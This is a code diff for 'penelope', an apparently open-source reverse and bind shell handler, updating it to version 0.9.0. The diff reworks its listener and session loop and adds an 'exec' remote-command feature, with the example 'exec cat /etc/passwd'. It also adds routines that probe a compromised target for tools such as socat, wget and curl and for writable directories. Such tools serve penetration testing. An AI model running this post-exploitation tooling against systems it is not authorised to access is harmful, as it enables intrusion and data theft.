@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.8.5"
+__version__ = "0.9.0"
 
 import os
 import io
@@ -25,11 +25,15 @@ import sys
 import tty
 import cmd
 import code
-import uuid
 import time
 import json
+import zlib
+import glob
 import errno
 import shlex
+import queue
+import struct
+import shutil
 import select
 import socket
 import signal
@@ -39,13 +43,15 @@ import random
 import termios
 import tarfile
 import logging
+import zipfile
+import inspect
+import binascii
 import textwrap
 import argparse
 import platform
 import threading
 import subprocess
 import urllib.request
-import multiprocessing
 
 from pathlib import Path
 from datetime import datetime
@@ -69,7 +75,7 @@ class MainMenu(cmd.Cmd):
 		super().__init__()
 		self.set_id(None)
 		self.commands = {
-			"Session Operations":['run', 'upload', 'download', 'open', 'maintain', 'spawn', 'upgrade'],
+			"Session Operations":['run', 'upload', 'download', 'open', 'maintain', 'spawn', 'upgrade', 'exec'],
 			"Session Management":['sessions', 'use', 'interact', 'kill', 'dir|.'],
 			"Shell Management"  :['listeners', 'connect', 'hints', 'Interfaces'],
 			"Miscellaneous"     :['help', 'history', 'reset', 'SET', 'DEBUG', 'exit|quit|q|Ctrl+D']
@@ -84,13 +90,13 @@ class MainMenu(cmd.Cmd):
 		active_sessions = len(core.sessions)
 		if active_sessions:
 			s = "s" if active_sessions > 1 else ""
-			return paint(f" ({active_sessions} active session{s})",'red')\
+			return paint(f" ({active_sessions} active session{s})", 'red')\
 			+ paint('', 'yellow')
 		return ""
 
 	@staticmethod
 	def sessions(text, *extra):
-		options = list(map(str,core.sessions))
+		options = list(map(str, core.sessions))
 		options.extend(extra)
 		return [option for option in options if option.startswith(text)]
 
@@ -98,7 +104,7 @@ class MainMenu(cmd.Cmd):
 	def confirm(text):
 		try:
 			__class__.set_auto_history(False)
-			answer = input(f"\r{paint(f'[?] {text} (y/N): ','yellow')}")
+			answer = input(f"\r{paint(f'[?] {text} (y/N): ', 'yellow')}")
 			__class__.set_auto_history(True)
 			return answer.lower() == 'y'
 
@@ -134,9 +140,9 @@ class MainMenu(cmd.Cmd):
 
 	def set_id(self, ID):
 		self.sid = ID
-		session_part = f"{paint('Session','green')} {paint('['+str(self.sid),'red')}{paint(']','red')} "\
+		session_part = f"{paint('Session', 'green')} {paint('['+str(self.sid), 'red')}{paint(']', 'red')} "\
 				if self.sid else ''
-		self.prompt = f"{paint(f'┍┽ {__program__} ┾┑','magenta')} {session_part}> "
+		self.prompt = f"{paint(f'┍┽ {__program__} ┾┑', 'magenta')} {session_part}> "
 
 	def session(current=False, extra=[]):
 		def inner(func):
@@ -214,7 +220,7 @@ class MainMenu(cmd.Cmd):
 					f"Issue 'help' for all available commands")
 		else:
 			for section in self.commands:
-				print(f'\n{section}\n{"="*len(section)}\n')
+				print(f'\n{section}\n{"="*len(section)}')
 				table = Table(joinchar=' · ')
 				for command in self.commands[section]:
 					parts = textwrap.dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")[1:3]
@@ -270,8 +276,7 @@ class MainMenu(cmd.Cmd):
 			interact	Interact with current session
 			interact 1	Interact with SessionID 1
 		"""
-		core.sessions[ID].attach()
-		return True
+		return core.sessions[ID].attach()
 
 	@session(extra=['*'])
 	def do_kill(self, ID):
@@ -286,14 +291,12 @@ class MainMenu(cmd.Cmd):
 			kill *		Kill all sessions
 		"""
 		if ID == '*':
-			session_count = len(core.sessions)
-
-			if not session_count:
+			if not core.sessions:
 				cmdlogger.warning("No sessions to kill")
 				return False
 			else:
 				if __class__.confirm(f"Kill all sessions{self.active_sessions}"):
-					for session in core.sessions.copy().values():
+					for session in reversed(core.sessions.copy().values()):
 						session.kill()
 				return
 		else:
@@ -368,7 +371,7 @@ class MainMenu(cmd.Cmd):
 		"""
 		if local_globs:
 			for glob in shlex.split(local_globs):
-				core.sessions[self.sid].upload(glob)
+				core.sessions[self.sid].upload(glob, randomize_fname=True)
 		else:
 			cmdlogger.warning("No files or directories specified")
 
@@ -380,12 +383,16 @@ class MainMenu(cmd.Cmd):
 		print("\n", table, "\n", sep="")
 
 	@session(current=True)
-	def do_run(self, module):
+	def do_run(self, module_name):
 		"""
 		[module name]
 		Run a module. Run 'help run' to view the available modules"""
-		if module:
-			self.cmdqueue.extend(options.modules[module]['actions'][core.sessions[self.sid].OS])
+		if module_name:
+			module = options.modules.get(module_name)
+			if module:
+				self.cmdqueue.extend(module['actions'][core.sessions[self.sid].OS])
+			else:
+				logger.warning(f"Module '{module_name}' does not exist")
 		else:
 			self.show_modules()
 
@@ -468,12 +475,16 @@ class MainMenu(cmd.Cmd):
 	@session(current=True)
 	def do_exec(self, cmdline):
 		"""
-
+		<remote command>
 		Execute a remote command
+
+		Examples:
+			exec cat /etc/passwd
 		"""
 		if cmdline:
-			output = core.sessions[self.sid].exec(f"{cmdline} 2>&1|base64 -w0", raw=False)
-			print(base64.b64decode(output).decode()[:-1])
+			output = core.sessions[self.sid].exec(cmdline, agent_typing=True)
+			if output:
+				print(output.decode(), end='')
 		else:
 			cmdlogger.warning("No command to execute")
 
@@ -499,7 +510,7 @@ class MainMenu(cmd.Cmd):
 					if subcommand == "stop" and host == "*":
 						listeners = core.listeners.copy()
 						if listeners:
-							for listener in listeners:
+							for listener in listeners.values():
 								listener.stop()
 						else:
 							cmdlogger.warning("No listeners to stop...")
@@ -516,10 +527,11 @@ class MainMenu(cmd.Cmd):
 
 			if subcommand == "add":
 				host = Interfaces().translate(host)
-				Listener(host,port)
+				Listener(host, port)
+
 			elif subcommand == "stop":
-				for listener in core.listeners:
-					if (listener.host,listener.port) == (host,port):
+				for listener in core.listeners.values():
+					if (listener.host, listener.port) == (host, port):
 						listener.stop()
 						break
 				else:
@@ -531,7 +543,7 @@ class MainMenu(cmd.Cmd):
 				return False
 		else:
 			if core.listeners:
-				for listener in core.listeners:
+				for listener in core.listeners.values():
 					print(listener)
 			else:
 				cmdlogger.warning("No registered Listeners...")
@@ -552,7 +564,7 @@ class MainMenu(cmd.Cmd):
 			cmdlogger.error("Invalid Host-Port combination")
 
 		else:
-			if Connect(address,port) and not options.no_attach:
+			if Connect(address, port) and not options.no_attach:
 				return True
 
 	def do_hints(self, line):
@@ -562,7 +574,7 @@ class MainMenu(cmd.Cmd):
 		"""
 		if core.listeners:
 			print()
-			for listener in core.listeners:
+			for listener in core.listeners.values():
 				print(paint(f"{listener} hints:", 'cyan', 'UNDERLINE'))
 				print(listener.hints, end='\n\n')
 		else:
@@ -601,6 +613,9 @@ class MainMenu(cmd.Cmd):
 		"""
 		if __class__.confirm(f"Exit Penelope?{self.active_sessions}"):
 			core.stop()
+			for thread in threading.enumerate():
+				if thread.name == 'Core':
+					thread.join()
 			logger.info("Exited!")
 			return True
 		return False
@@ -622,8 +637,8 @@ class MainMenu(cmd.Cmd):
 		"""
 		__class__.write_history(options.cmd_histfile)
 		__class__.load_history(options.debug_histfile)
-		code.interact(banner=paint("===> Entering debugging console...",'CYAN'), local=globals(),
-			exitmsg=paint("<=== Leaving debugging console...",'CYAN'))
+		code.interact(banner=paint("===> Entering debugging console...", 'CYAN'), local=globals(),
+			exitmsg=paint("<=== Leaving debugging console...", 'CYAN'))
 		__class__.write_history(options.debug_histfile)
 		__class__.load_history(options.cmd_histfile)
 
@@ -667,7 +682,7 @@ class MainMenu(cmd.Cmd):
 				cmdlogger.error(f"{type(e).__name__}: {e}")
 
 	def default(self, line):
-		if line in ['q','quit']:
+		if line in ['q', 'quit']:
 			return self.onecmd('exit')
 		elif line == '.':
 			return self.onecmd('dir')
@@ -690,18 +705,23 @@ class MainMenu(cmd.Cmd):
 		return [option for option in options.__dict__ if option.startswith(text)]
 
 	def complete_listeners(self, text, line, begidx, endidx):
-		subcommands = ["add","stop"]
+		subcommands = ["add", "stop"]
 		if begidx == 10:
 			return [command for command in subcommands if command.startswith(text)]
 		if begidx == 14:
-			return [iface_ip for iface_ip in Interfaces().list_all + ['any','0.0.0.0'] if iface_ip.startswith(text)]
+			return [iface_ip for iface_ip in Interfaces().list_all + ['any', '0.0.0.0'] if iface_ip.startswith(text)]
 		if begidx == 15:
-			listeners = [re.search(r'\((.*)\)', str(listener))[1].replace(':',' ') for listener in core.listeners]
+			listeners = [re.search(r'\((.*)\)', str(listener))[1].replace(':', ' ') for listener in core.listeners]
 			if len(listeners) > 1:
 				listeners.append('*')
 			return [listener for listener in listeners if listener.startswith(text)]
 		if begidx > 15:
-			...#print(line,text)
+			...#print(line, text)
+
+	# Default cmd module is unable to do that. I will make my own cmd class
+	#def complete_upload(self, text, line, begidx, endidx):
+	#	print("text: ", shlex.quote(text))
+	#	return [item for item in glob.glob(shlex.quote(text) + '*')]
 
 	def complete_use(self, text, line, begidx, endidx):
 		return self.sessions(text, "none")
@@ -720,103 +740,92 @@ class MainMenu(cmd.Cmd):
 
 
 class ControlQueue:
+
 	def __init__(self):
-		self.queue = multiprocessing.SimpleQueue()
+		self._out, self._in = os.pipe()
+		self.queue = queue.Queue(1) # TODO
 
 	def fileno(self):
-		return self.queue._reader.fileno()
+		return self._out
 
 	def __lshift__(self, command):
+		os.write(self._in, b'\x00')
 		self.queue.put(command)
 
 	def get(self):
-		while not self.queue.empty():
-			yield self.queue.get()
+		os.read(self._out, 1)
+		return self.queue.get()
 
 
 class Core:
 
 	def __init__(self):
 		self.control = ControlQueue()
-		self.rlist = {self.control}
-		self.wlist = set()
-		self.listeners = set()
-		self.sessions = dict()
+		self.rlist = [self.control]
+		self.wlist = []
 		self.attached_session = None
-		self.ID = 0
+		self.session_wait_host = None
+		self.session_wait = queue.LifoQueue()
 		self.started = False
+		self.sessionID = 0
+		self.listenerID = 0
 		self.lock = threading.Lock()
+		self.sessions = {}
+		self.listeners = {}
 
 	def __getattr__(self, name):
-		if name == 'newID':
-			self.ID += 1
-			return self.ID
+#		if name in ('listeners', 'sessions'):
+#			_class = eval(name.capitalize()[:-1])
+#			return {item.id:item for item in self.rlist if type(item) is _class}
+
+		if name == 'hosts':
+			hosts = defaultdict(list)
+			for session in self.sessions.values():
+				hosts[session.name].append(session)
+			return hosts
+
+		elif name == 'new_listenerID':
+			with self.lock:
+				self.listenerID += 1
+				return self.listenerID
+
+		elif name == 'new_sessionID':
+			with self.lock:
+				self.sessionID += 1
+				return self.sessionID
 
 	@property
 	def threads(self):
-		return (thread.name for thread in threading.enumerate())
-
-	@property
-	def hosts(self):
-		hosts = defaultdict(list)
-		for session in self.sessions.values():
-			hosts[session.name].append(session)
-		return hosts
+		return [thread.name for thread in threading.enumerate()]
 
 	def start(self):
 		self.started = True
 		threading.Thread(target=self.loop, name="Core").start()
 
 	def loop(self):
-		while True:
-			try:
-				readables, writeables, _ = select.select(self.rlist, self.wlist, [])
 
-			except (ValueError, OSError) as e:
-				logger.debug(e)
-				continue
-
-			for writeable in writeables:
-
-				try:
-					position = writeable.outbuf.tell()
-					data = writeable.outbuf.read()
-					sent = writeable.socket.send(data)
-					if sent == len(data):
-						writeable.outbuf.seek(0)
-						writeable.outbuf.truncate(0)
-						self.wlist.discard(writeable)
-					else:
-						writeable.outbuf.seek(position + sent)
-
-				except (OSError, ConnectionResetError, BrokenPipeError):
-					session.exit()
+		while self.started:
+			readables, writables, _ = select.select(self.rlist, self.wlist, [])
 
 			for readable in readables:
 
-				# The control pipe
+				# The control queue
 				if readable is self.control:
-					for command in self.control.get():
-						logger.debug(f"Control Queue: {command}")
-						if command == 'stop':
-							return
-						elif command == '+stdin':
-							self.rlist.add(sys.stdin)
-						elif command == '-stdin':
-							self.rlist.discard(sys.stdin)
+					command = self.control.get()
+					logger.debug(f"About to execute {command}")
+					try:
+						exec(command)
+					except KeyError: # TODO
+						logger.debug("The session does not exist anymore")
+					break
 
 				# The listeners
 				elif readable.__class__ is Listener:
-
-					try:
-						_socket, endpoint = readable.socket.accept()
-						thread_name = f"IncomingConnection-{endpoint}"
-						logger.debug(f"New thread: {thread_name}")
-						threading.Thread(target=Session, args=(_socket, *endpoint, readable),
-							name=thread_name).start()
-
-					except OSError:
-						logger.debug(f"{readable} socket is terminated")
+					_socket, endpoint = readable.socket.accept()
+					thread_name = f"NewCon{endpoint}"
+					logger.debug(f"New thread: {thread_name}")
+					threading.Thread(target=Session, args=(_socket, *endpoint, readable),
+						name=thread_name).start()
 
 				# STDIN
 				elif readable is sys.stdin:
@@ -825,10 +834,7 @@ class Core:
 
 						data = os.read(sys.stdin.fileno(), NET_BUF_SIZE)
 
-						if session.type == 'PTY':
-							session.update_pty_size()
-
-						if session.is_cmd:
+						if session.subtype == 'cmd':
 							self._cmd = data
 
 						if data == options.escape['sequence']:
@@ -839,71 +845,107 @@ class Core:
 							else:
 								session.detach()
 						else:
-							if session.type == 'Basic': # need to see
+							if session.type == 'Basic': # TODO # need to see
 								session.record(data,
 									_input=not session.interactive)
 
+							if session.agent:
+								data = Messenger.message(Messenger.SHELL, data)
+
 							session.send(data, stdin=True)
 					else:
-						logger.error("You shouldn't see this error; Please take a screenshot and report it")
+						logger.error("You shouldn't see this error; Please report it")
 
 				# The sessions
 				else:
 					try:
-						with readable.lock:
-							data = readable.socket.recv(NET_BUF_SIZE)
+						data = readable.socket.recv(NET_BUF_SIZE)
+						if not data:
+							raise OSError
+						if hasattr(readable, 'progress_recv'):
+							readable.progress_recv.queue.put(len(data))
 
-							if not data:
-								raise BrokenPipeError
+					except OSError:
+						logger.debug(f"Died while reading")
+						readable.kill()
+						threading.Thread(target=readable.maintain).start()
+						break
 
-							if b'\x1b[?1049h' in data:
-								readable.alternate_buffer = True
+					target = readable.shell_response_buf\
+					if not readable.subchannel.active\
+					and readable.subchannel.allow_receive_data\
+					else readable.subchannel
 
-							if b'\x1b[?1049l' in data:
-								readable.alternate_buffer = False
+					if readable.agent:
+						for _type, _value in readable.messenger.feed(data):
+							if _type == Messenger.SHELL:
+								target.write(_value)
+							else:
+								readable.responses.put(_value)
+					else:
+						target.write(data)
 
-							if readable.is_cmd and self._cmd == data:
-								data, self._cmd = b'', b''
+					shell_output = readable.shell_response_buf.getvalue()
+					if shell_output:
+						if readable.is_attached:
+							os.write(sys.stdout.fileno(), shell_output)
 
-							if readable.is_attached:
-								os.write(sys.stdout.fileno(), data)
+						readable.record(shell_output)
 
-							readable.record(data)
+						if b'\x1b[?1049h' in data:
+							readable.alternate_buffer = True
 
-					except BlockingIOError:
-						# The exec loop stole the packets as should thanks to the lock
-						pass
+						if b'\x1b[?1049l' in data:
+							readable.alternate_buffer = False
+						#if readable.subtype == 'cmd' and self._cmd == data:
+						#	data, self._cmd = b'', b'' # TODO
 
-					except (ConnectionResetError, BrokenPipeError):
-						readable.exit()
+						readable.shell_response_buf.seek(0)
+						readable.shell_response_buf.truncate(0)
 
-					except OSError as e:
-						if e.errno == errno.EBADF:
-							# The menu thread killed the session
-							pass
+			else:
+				for writable in writables:
+					with writable.wlock:
+						data = writable.outbuf.read(NET_BUF_SIZE)
+						if len(data) < NET_BUF_SIZE:
+							writable.outbuf.seek(0)
+							writable.outbuf.truncate(0)
+							self.wlist.remove(writable)
+						if not data:
+							continue
+
+						try:
+							sent = writable.socket.send(data)
+							if hasattr(writable, 'progress_send'):
+								writable.progress_send.queue.put(sent)
+
+						except OSError:
+							logger.debug(f"Died while writing")
+							writable.kill()
+							threading.Thread(target=writable.maintain).start()
+							break
 
 	def stop(self):
 		options.maintain = 0
 
-		sessions = self.sessions.copy().values()
-		if sessions:
+		if self.sessions:
 			logger.warning(f"Killing sessions...")
-			for session in sessions:
-				session.exit()
+			for session in reversed(self.sessions.copy().values()):
+				session.kill()
 
-		for listener in self.listeners.copy():
+		for listener in self.listeners.copy().values():
 			listener.stop()
 
-		self.control << 'stop'
-		self.started = False
+		self.control << 'self.started = False'
 
 
 def Connect(host, port):
+
 	try:
 		port = int(port)
 		_socket = socket.socket()
 		_socket.settimeout(5)
-		_socket.connect((host,port))
+		_socket.connect((host, port))
 		_socket.settimeout(None)
 
 	except ConnectionRefusedError:
@@ -920,9 +962,10 @@ def Connect(host, port):
 
 	else:
 		if not core.started: core.start()
-		logger.info(f"Connected to {paint(host,'blue')}:{paint(port,'red')} 🎯")
+		logger.info(f"Connected to {paint(host, 'blue')}:{paint(port, 'red')} 🎯")
 		session = Session(_socket, host, port)
-		if session: return True
+		if session:
+			return True
 
 	return False
 
@@ -933,9 +976,10 @@ class Listener:
 		self.host = options.interface if host is None else host
 		self.host = Interfaces().translate(self.host)
 		port = options.port if port is None else port
-		self.socket = socket.socket()
+		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		self.socket.setblocking(False)
+		self.caller = caller()
 
 		try:
 			self.port = int(port)
@@ -949,7 +993,9 @@ class Listener:
 
 		except OSError as e:
 			if e.errno == errno.EADDRINUSE:
-				logger.error(f"The port {self.port} is currently in use")
+				if not self.caller == 'spawn':
+					logger.error(f"The port {self.port} is currently in use")
+
 			elif e.errno == errno.EADDRNOTAVAIL:
 				logger.error(f"Cannot listen on the requested address")
 
@@ -960,42 +1006,60 @@ class Listener:
 			logger.error("Port number must be numeric")
 
 		else:
-			logger.info(f"Listening for reverse shells on {paint(self.host,'blue')}"
-				f" 🚪{paint(self.port,'red')} ")
-			self.socket.listen(5)
-			if not core.started: core.start()
-			core.listeners.add(self)
-			core.rlist.add(self)
-			core.control << "break"
-
-			if options.hints:
-				print(self.hints)
-
+			self.start()
 			return
 
 	def __str__(self):
 		return f"Listener({self.host}:{self.port})"
 
+	def __bool__(self):
+		return hasattr(self, 'id')
+
 	def fileno(self):
 		return self.socket.fileno()
 
+	def start(self):
+		logger.info(f"Listening for reverse shells on {paint(self.host, 'blue')}"
+			f" 🚪{paint(self.port, 'red')} ")
+
+		self.socket.listen(5)
+
+		self.id = core.new_listenerID
+		core.rlist.append(self)
+		core.listeners[self.id] = self
+		if not core.started:
+			core.start()
+
+		core.control << "" # TODO
+
+		if options.hints:
+			print(self.hints)
+
 	def stop(self):
 
-		if options.single_session and core.sessions:
-			logger.info(f"Stopping {self} due to Single Session mode")
+		if threading.current_thread().name != 'Core':
+			core.control << f'self.listeners[{self.id}].stop()'
+			return
 
+		core.rlist.remove(self)
+		del core.listeners[self.id]
+
+		try:
+			self.socket.shutdown(socket.SHUT_RDWR)
+
+		except OSError as e:
+			if e.errno == 107: # or e.errno == 9:
+				logger.debug("The socket is already terminated")
+			else:
+				raise
+
+		self.socket.close()
+
+		if options.single_session and core.sessions and not self.caller == 'spawn':
+			logger.info(f"Stopping {self} due to Single Session mode")
 		else:
 			logger.warning(f"Stopping {self}")
 
-		try:
-			core.listeners.discard(self)
-			core.rlist.discard(self)
-			core.control << "break"
-
-		except (ValueError,OSError):
-			logger.debug("The {self} is already destroyed")
-
-		self.socket.close()
 
 	@property
 	def hints(self):
@@ -1014,12 +1078,13 @@ class Listener:
 			output.extend([preset.format(paint(ip, 'blue'),
 				paint(self.port, 'yellow', 'DIM')) for preset in presets])
 
-		output.append("─" * Table.real_len(max(output, key=Table.real_len)))
+		output.append("─" * len(max(output, key=len)))
 
 		return '\n'.join(output)
 
 
 class LineBuffer:
+
 	def __init__(self):
 		self.len = 100
 		self.buffer = deque(maxlen=self.len)
@@ -1030,7 +1095,26 @@ class LineBuffer:
 
 	def __bytes__(self):
 		lines = os.get_terminal_size().lines
-		return b''.join(list(islice(self.buffer,0,lines-1))[::-1])
+		return b''.join(list(islice(self.buffer, 0, lines-1))[::-1])
+
+
+class Channel:
+
+	def __init__(self, raw=False, expect = []):
+		self._read, self._write = os.pipe()
+		self.can_use = True
+		self.active = False
+		self.allow_receive_data = True
+		self.control = ControlQueue()
+
+	def fileno(self):
+		return self._read
+
+	def read(self):
+		return os.read(self._read, NET_BUF_SIZE)
+
+	def write(self, data):
+		os.write(self._write, data)
 
 
 class Session:
@@ -1039,9 +1123,11 @@ class Session:
 		print("\a", flush=True, end='')
 
 		self.socket = _socket
+		self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 		self.socket.setblocking(False)
 		self.target, self.port = target, port
 		self.ip = _socket.getpeername()[0]
+		self._host, self._port = self.socket.getsockname()
 
 		if target == self.ip:
 			try:
@@ -1055,14 +1141,16 @@ class Session:
 
 		self.name = f"{self.hostname}~{self.ip}" if self.hostname else self.ip
 		self.listener = listener
-		self.latency = options.latency
 
 		self.OS = None
 		self.type = None
+		self.subtype = None
 		self.interactive = None
 		self.echoing = None
 
-		self.upgrade_attempted = False
+		self.version = None
+		self.user = None
+
 		self.dimensions = None
 		self.prompt = None
 		self.new = True
@@ -1070,11 +1158,27 @@ class Session:
 
 		self.last_lines = LineBuffer()
 		self.lock = threading.Lock()
-		self.control = ControlQueue()
+		self.wlock = threading.Lock()
+
 		self.outbuf = io.BytesIO()
+		self.shell_response_buf = io.BytesIO()
+
+		self.subchannel = Channel()
+		self.latency = None
 
 		self.alternate_buffer = False
 		self.need_resize = False
+		self.agent = False
+		self.messenger = Messenger()
+		self.responses = queue.SimpleQueue()
+
+		self._bin = defaultdict(lambda: "")
+		self._tmp = None
+
+		self.id = core.new_sessionID
+		logger.debug(f"Assigned session ID: {self.id}")
+		core.rlist.append(self)
+		core.sessions[self.id] = self
 
 		if self.determine():
 
@@ -1083,13 +1187,8 @@ class Session:
 			logger.debug(f"Interactive: {self.interactive}")
 			logger.debug(f"Echoing: {self.echoing}")
 
-			if not core.started:
-				return
-
-#			with core.lock:
-			self.id = core.newID
-			core.sessions[self.id] = self
-			core.rlist.add(self)
+			if self.name == core.session_wait_host:
+				core.session_wait.put(self.id)
 
 			logger.info(f"Got {self.source} shell from {OSes[self.OS]} "
 				f"{paint(self.name, 'white', 'RED')}{paint('', 'green')} 💀 - "
@@ -1102,25 +1201,30 @@ class Session:
 				self.logpath = self.directory / f"{self.name}.log"
 				self.logfile = open(self.logpath, 'ab', buffering=0)
 				if not options.no_timestamps and not self.logpath.exists():
-					self.logfile.write(datetime.now().strftime(paint("%Y-%m-%d %H:%M:%S: ",'magenta')).encode())
+					self.logfile.write(datetime.now().strftime(paint("%Y-%m-%d %H:%M:%S: ", 'magenta')).encode())
 
 			self.maintain()
 
-			if options.single_session and self.listener: self.listener.stop()
+			if options.single_session and self.listener:
+				self.listener.stop()
+
+			attach_conditions = [
+				# Is a reverse shell and the Menu is not active and reached the maintain value
+				self.listener and not "Menu" in core.threads and len(core.hosts[self.name]) == options.maintain,
+
+				# Is a bind shell and is not spawned from the Menu
+				not self.listener and not "Menu" in core.threads,
+
+				# Is a bind shell and is spawned from the connect Menu command
+				not self.listener and "Menu" in core.threads and menu.lastcmd.startswith('connect')
+			]
 
 			# If no other session is attached
 			if core.attached_session is None:
 				# If auto-attach is enabled
 				if not options.no_attach:
-					# If is reverse shell and the Menu is not active and reached the maintain value
-					if ((self.listener and not "Menu" in core.threads
-						and len(core.hosts[self.name]) == options.maintain)
-					# Or is a bind shell and is not spawned from the Menu
-					or (not self.listener and not "Menu" in core.threads)
-					# Or is a bind shell and is spawned from the connect Menu command
-					or (not self.listener and "Menu" in core.threads
-						and menu.lastcmd.startswith('connect'))):
-						# Then attach the newly created session
+					if any(attach_conditions):
+						# Attach the newly created session
 						self.attach()
 
 				# If auto-attach is disabled and the menu is not active
@@ -1128,40 +1232,82 @@ class Session:
 					# Then show the menu
 					menu.show()
 		else:
-			logger.error(f"Invalid shell from {paint(self.name, 'RED', 'white')}{paint('', 'red')} 🙄\r")
 			self.kill()
 
+		return
+
 	def __bool__(self):
-		return bool(self.socket.fileno() != -1 and self.OS)
+		return self.socket.fileno() != -1# and self.OS)
 
 	def __str__(self):
 		if menu.sid == self.id:
-			ID = paint('[' + str(self.id) + ']','red')
+			ID = paint('[' + str(self.id) + ']', 'red')
 
 		elif self.new:
-			ID = paint('<' + str(self.id) + '>','yellow','BLINK')
+			ID = paint('<' + str(self.id) + '>', 'yellow', 'BLINK')
 
 		else:
-			ID = paint('(' + str(self.id) + ')','yellow')
+			ID = paint('(' + str(self.id) + ')', 'yellow')
 
 		source = 'Reverse shell from ' + str(self.listener) if self.listener \
 			else f'Bind shell (port {self.port})'
 
-		return (f"\n{paint('SessionID ','blue')}{ID}\n"
-			f"{paint('    └──── ','blue')}"
-			f"{paint('Host: ','green')}{paint(self.name,'RED')}\n"
-			f"\t  {paint('Shell Type: ','green')}"
-			f"{paint(self.type,'CYAN') if not self.type == 'Basic' else self.type}\n"
-			f"\t  {paint('OS Family: ','green')}{self.OS}\n"
-			f"\t  {paint('Source: ','green')}{source}"
+		return (f"\n{paint('SessionID ', 'blue')}{ID}\n"
+			f"{paint('    └──── ', 'blue')}"
+			f"{paint('Host: ', 'green')}{paint(self.name, 'RED')}\n"
+			f"\t  {paint('Shell Type: ', 'green')}"
+			#f"{paint('Control', 'YELLOW') if self.control else self.type}\n"
+			f"{paint(self.type, 'CYAN') if not self.type == 'Basic' else self.type}\n"
+			f"\t  {paint('OS Family: ', 'green')}{self.OS}\n"
+			f"\t  {paint('Source: ', 'green')}{source}"
 		)
 
 	def __repr__(self):
-		return (f"{__class__.__name__}({self.name}, {self.OS}, {self.type},"
-			f" interactive={self.interactive}, echoing={self.echoing})")
+		return (f"ID: {self.id} -> {__class__.__name__}({self.name}, {self.OS}, {self.type}, "
+			f"interactive={self.interactive}, echoing={self.echoing})")
 
 	def fileno(self):
 		return self.socket.fileno()
+
+	@property
+	def spare_control_sessions(self):
+		return [session for session in self.control_sessions if session is not self]
+
+	@property
+	def need_control_sessions(self):
+		return [session for session in core.hosts[self.name] if session.need_control_session]
+
+	@property
+	def need_control_session(self):
+		return self.type == 'PTY' and not self.agent
+
+	@property
+	def control_sessions(self):
+		return [session for session in core.hosts[self.name] if not session.need_control_session]
+
+	@property
+	def control_session(self):
+		if self.need_control_session:
+			for session in core.hosts[self.name]:
+				if not session.need_control_session:
+					return session
+			return None #self.spawn() #TODO
+		else:
+			return self
+
+	@property
+	def cwd(self):
+
+		if self.OS == 'Unix':
+			cmd = f"readlink -f /proc/{self.pid}/cwd"
+			if self.agent:
+				self.send(Messenger.message(Messenger.SHELL_EXEC, cmd.encode()))
+				return self.responses.get().rstrip().decode()
+			else:
+				return self.control_session.exec(cmd, value=True)
+
+		elif self.OS == 'Windows':
+			pass
 
 	@property
 	def is_attached(self):
@@ -1172,25 +1318,92 @@ class Session:
 		return 'reverse' if self.listener else 'bind'
 
 	@property
-	def is_cmd(self):
-		return (self.OS == 'Windows'
-			and self.type == 'Basic'
-			and self.echoing)
+	def bin(self):
+		if not self._bin:
+			if self.OS == "Unix":
+				binaries = [
+					"sh", "bash", "python", "python3",
+					"script", "socat", "stty", "echo", "base64", "wget",
+					"curl", "tar", "rm", "stty", "nohup", "find"
+				]
+				response = self.exec(f'for i in {" ".join(binaries)}; do which $i 2>/dev/null || echo;done')
+				if response:
+					self._bin = dict(zip(binaries, response.decode().splitlines()))
+
+				missing = [b for b in binaries if not self._bin[b].startswith("/")]
+
+				if missing:
+					logger.debug(paint(f"We didn't find the binaries: {missing}. Trying another method", 'red')) 
+					response = self.exec(f'for bin in {" ".join(missing)}; do for dir in '
+						f'{" ".join(LINUX_PATH.split(":"))}; do _bin=$dir/$bin; ' # TODO PATH
+						'test -f $_bin && break || unset _bin; done; echo $_bin; done')
+					if response:
+						self._bin.update(dict(zip(missing, response.decode().splitlines())))
+
+			for binary in options.black_list_bins:
+				self._bin[binary] = None
+
+			result = "\n".join([f"{b}: {self._bin[b]}" for b in binaries])
+			logger.debug(f"Available binaries on target: \n{paint(result, 'red')}")
+
+		return self._bin
+
+	@property
+	def tmp(self):
+		if self._tmp is None:
+			if self.OS == "Unix":
+				logger.debug(f"Trying to find a writable directory on target")
+				tmpname = rand(10)
+				common_dirs = ("/dev/shm", "/tmp", "/var/tmp")
+
+				for directory in common_dirs:
+					if not self.exec(f'echo {tmpname} > {directory}/{tmpname}'):
+						self.exec(f'rm {directory}/{tmpname}')
+						self._tmp = directory
+						break
+				else:
+					candidate_dirs = self.exec(f'find / -type d -writable 2>/dev/null')
+					if candidate_dirs:
+						for directory in candidate_dirs.decode().splitlines():
+							if directory in common_dirs:
+								continue
+							if not self.exec(f'echo {tmpname} > {directory}/{tmpname}'):
+								self.exec(f'rm {directory}/{tmpname}')
+								self._tmp = directory
+								break
+				if not self._tmp:
+					self._tmp = False
+					logger.warning("Cannot find writable directory on target...")
+				else:
+					logger.debug(f"Available writable directory on target: {paint(self._tmp, 'RED')}")
+
+			elif self.OS == "Windows":
+				self._tmp = "%TEMP%"
+
+		return self._tmp
+
 
 	def send(self, data, stdin=False):
-		position = self.outbuf.tell()
-		self.outbuf.seek(0, io.SEEK_END)
-		self.outbuf.write(data)
-		self.outbuf.seek(position)
-		core.wlist.add(self)
-		if not stdin:
-			core.control << 'break'
+		with self.wlock: #TODO
+			if not self in core.rlist:
+				return False
+
+			position = self.outbuf.tell()
+			self.outbuf.seek(0, io.SEEK_END)
+			self.outbuf.write(data)
+			self.outbuf.seek(position)
+
+			self.subchannel.allow_receive_data = True
+
+			if self not in core.wlist:
+				core.wlist.append(self)
+			if not stdin:
+				core.control << ""
 
 	def record(self, data, _input=False):
 		self.last_lines << data
-
 		if not options.no_log:
-			self.log(data,_input)
+			self.log(data, _input)
 
 	def log(self, data, _input=False):
 		#data=re.sub(rb'(\x1b\x63|\x1b\x5b\x3f\x31\x30\x34\x39\x68|\x1b\x5b\x3f\x31\x30\x34\x39\x6c)', b'', data)
@@ -1198,11 +1411,11 @@ class Session:
 
 		if not options.no_timestamps:
 			timestamp = datetime.now().strftime(paint("%Y-%m-%d %H:%M:%S: ", 'magenta'))
